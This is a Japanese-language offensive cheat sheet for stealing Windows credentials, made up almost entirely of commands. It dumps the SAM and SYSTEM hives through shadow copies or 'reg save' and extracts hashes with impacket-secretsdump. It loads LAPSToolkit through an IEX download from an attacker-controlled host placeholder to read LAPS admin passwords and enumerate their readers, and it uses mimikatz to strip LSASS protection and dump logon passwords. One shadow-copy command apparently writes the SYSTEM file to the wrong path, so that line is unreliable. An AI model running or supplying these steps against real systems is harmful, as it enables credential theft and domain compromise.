# SAMデータベース

### vssadminを使用
shadowcopy
```cmd
wmic shadowcopy call create Volume='C:\'
```

SAMデータベースとSYSTEMファイルをDownnloadsフォルダにコピー
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Tools\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Tools\sam
```

## regを使用
```
reg save HKLM\sam C:\Tools\sam
reg save HKLM\system C:\Tools\system
```

## secretsdump
vssadminかregでダンプしたsamデータベースとsystemファイルをkaliに持ってきた後、
impacket-secretsdumpを使用してデータベースから抽出
```sh
impacket-secretsdump -sam /home/kali/sam -system /home/kali/system LOCAL
```


# LAPS
https://github.com/leoloobeek/LAPSToolkit

インポート
```
IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/LAPSToolkit.ps1')
```

```powershell
powershell -ep bypass
Import-Module .\LAPSToolkit.ps1
```

LAPSが設定されているコンピュータを一覧化
```powershell
Get-LAPSComputers
```

LAPSの平文パスワード（ms-mcs-AdmPwd属性）を読み取る権限が委任されているグループを探し出す
```powershell
Find-LAPSDelegatedGroups
```

PowerView を使用してLAPSパスワードリーダーのメンバーを列挙する
```powershell
import-module .\powerview.ps1
Get-NetGroupMember -GroupName "LAPS Password Readers"
```

メンバーとしてログオンセッション持ってれば、一覧化コマンドを実行することでパスワードを読み取れる
```
Get-LAPSComputers
```

# mimikatz
LSA保護を無効にしてLSASSダンプする
```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```
